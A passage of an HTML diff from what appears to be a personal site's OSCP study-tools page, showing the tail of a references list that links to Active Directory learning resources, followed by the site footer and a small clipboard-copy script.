+<li><a href="https://lizajose.github.io/getSH/ad">getSH Active Directory route</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li><a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/active-directory">Hexdump Active Directory module</a>. The live module was still a TODO when checked; no credential-access procedure was imported from it.</li>
+</ul></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
